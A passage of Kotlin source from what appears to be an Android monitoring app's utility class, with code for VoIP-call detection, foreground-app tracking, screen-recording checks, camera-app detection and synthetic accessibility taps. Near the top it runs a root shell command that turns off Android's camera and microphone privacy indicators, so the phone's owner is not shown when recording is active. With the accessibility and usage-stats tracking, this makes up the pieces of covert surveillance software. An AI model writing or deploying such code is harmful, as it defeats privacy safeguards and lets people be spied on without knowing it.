        val command = "device_config put privacy camera_mic_icons_enabled false default"
        try {
            process = runtime.exec("su")
            osw = OutputStreamWriter(process.outputStream)
            osw.write(command)
            osw.flush()
            osw.close()
        } catch (ex: IOException) {
            logVerbose("IndicatorInfo= Command Error1 is " + ex)
            ex.printStackTrace()
        } finally {
            if (osw != null) {
                try {
                    osw.close()
                } catch (e: IOException) {
                    logVerbose("IndicatorInfo= Command Error2 is " + e)
                    e.printStackTrace()
                }
            }
        }
        try {
            process?.waitFor()
        } catch (e: InterruptedException) {
            logVerbose("IndicatorInfo= Command Error3 is " + e)
            e.printStackTrace()
        }
    }

    fun isScreenRecordindPermissionGranted(): Boolean {
        return AppConstants.screenRecordingIntent != null
    }

    fun checkIsVoipCall(): Boolean {
        val lastAppName = if (AccessibilityUtils.voipMessenger.isNotEmpty()) {
            AccessibilityUtils.voipMessenger
        } else if (AccessibilityUtils.lastWindowPackage.isNotEmpty()) {
            getAppNameFromPackage(AccessibilityUtils.lastWindowPackage)
        } else {
            ""
        }
        return isVoipCallMessengerPackage(lastAppName)
    }

    private fun isVoipCallMessengerPackage(appName: String): Boolean {
        if (AppConstants.osGreaterThanEqualToTen &&
            AppConstants.voipCallApps != null && AppConstants.voipCallApps!!.isNotEmpty() && appName.isNotEmpty()
        ) {
            val gson = GsonBuilder().create()
            try {
                val voipCallApps = listOf(
                    *gson.fromJson(
                        AppConstants.voipCallApps,
                        Array<VoipCallApp>::class.java
                    )
                )
                voipCallApps.forEach {
                    if (appName.equals(it.appName, true)) {
                        return true
                    }
                }
            } catch (exception: Exception) {
                logVerbose(
                    "${AppConstants.VOIP_CALL_TYPE} isVOIPCallEnabled exp = ${exception.message}",
                    throwable = exception
                )
            }
        }
        return false
    }

    fun isUsageAccessPermissionGranted(context: Context): Boolean {
        return try {
            val packageManager: PackageManager = context.packageManager
            val applicationInfo = packageManager.getApplicationInfo(context.packageName, 0)
            val appOpsManager: AppOpsManager =
                context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            val mode = appOpsManager.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                applicationInfo.uid, applicationInfo.packageName
            )
            mode == AppOpsManager.MODE_ALLOWED
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    }

    fun retrieveNewApp(context: Context, appPackageName: String? = ""): String {
        return try {
            if (isUsageAccessPermissionGranted(context)) {
                var currentApp: String? = null
                val usm =
                    context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
                val time = System.currentTimeMillis()
                val appList =
                    usm.queryUsageStats(
                        UsageStatsManager.INTERVAL_DAILY,
                        time - 1000 * 1000,
                        time
                    )

                if (appList != null && appList.size > 0) {
                    val mySortedMap: SortedMap<Long, UsageStats> = TreeMap()
                    for (usageStats in appList) {
                        mySortedMap[usageStats.lastTimeUsed] = usageStats
                    }
                    if (mySortedMap != null && !mySortedMap.isEmpty()) {
                        currentApp = mySortedMap[mySortedMap.lastKey()]!!.packageName
                    }
                }

                currentApp ?: ""
            } else {
                AccessibilityUtils.lastWindowPackage
            }
        } catch (e: Exception) {
            ""
        }
    }

    fun requestUsageAccessPermission(context: Context) {
        if (!isUsageAccessPermissionGranted(context)) {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK
            intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK
            intent.flags = Intent.FLAG_ACTIVITY_NO_HISTORY
            intent.flags = Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            if (intent.resolveActivity(context.packageManager) != null) {
                context.startActivity(intent)
            } else {
                Toast.makeText(
                    context,
                    "Your Phone has not allowed to open Usage Access setting From App. Please Grant this permission manually",
                    Toast.LENGTH_LONG
                ).show()
            }

        } else {
            Toast.makeText(context, "Usage Access Permission Granted.", Toast.LENGTH_LONG).show()
        }
    }

    fun isDeviceIdentifierValid(): Boolean {
        return (AppConstants.activeIdentifier.isNullOrEmpty() || AppConstants.deviceIdentifier.equals(
            AppConstants.activeIdentifier
        ))
    }

    fun createUniqueIdentifier(): String {
        val allowedChars = ('A'..'Z') + ('a'..'z') + ('0'..'9')
        return (1..19)
            .map { allowedChars.random() }
            .joinToString("")
    }

    fun isAppSuspended(): Boolean = AppConstants.authToken.isNullOrEmpty()
    fun shouldRequestNewFcmToken(): Boolean {
        return AppConstants.fcmToken.isNullOrEmpty() || !AppConstants.fcmTokenStatus
    }

    @RequiresApi(Build.VERSION_CODES.N)
    public fun createClick(x: Float, y: Float): GestureDescription {
        // for a single tap a duration of 1 ms is enough
        val DURATION: Long = 1;

        val clickPath = Path();
        clickPath.moveTo(x, y);
        val clickStroke = GestureDescription.StrokeDescription(
            clickPath,
            0,
            DURATION
        ) as GestureDescription.StrokeDescription;
        val clickBuilder = GestureDescription.Builder() as GestureDescription.Builder;
        clickBuilder.addStroke(clickStroke);
        return clickBuilder.build();
    }

    fun defaultCameraAppOpened(context: Context): Boolean {
        var topPackage = ""
        if (AppUtils.isAccessibilityEnabled(context)) {
            topPackage = AccessibilityUtils.lastWindowPackage
        }
        return topPackage == AppUtils.getDefaultCamera()
    }

    // callback invoked either when the gesture has been completed or cancelled
    @RequiresApi(Build.VERSION_CODES.N)
    val callback = object : AccessibilityService.GestureResultCallback() {
        override fun onCancelled(gestureDescription: GestureDescription?) {
            super.onCancelled(gestureDescription)
        }

        override fun onCompleted(gestureDescription: GestureDescription?) {
            super.onCompleted(gestureDescription)
        }
    };

    fun isWorkRunning(context: Context, tag: String): Boolean {
        val instance = WorkManager.getInstance(context)
        val statuses = instance.getWorkInfosForUniqueWork(tag)
        return try {
            var running = false
            val workInfoList = statuses.get()
            for (workInfo in workInfoList) {
                val state = workInfo.state
                running = (state == WorkInfo.State.RUNNING)
            }
            running
        } catch (e: ExecutionException) {
            e.printStackTrace()
            false
        } catch (e: InterruptedException) {
            e.printStackTrace()
            false
        }
    }
}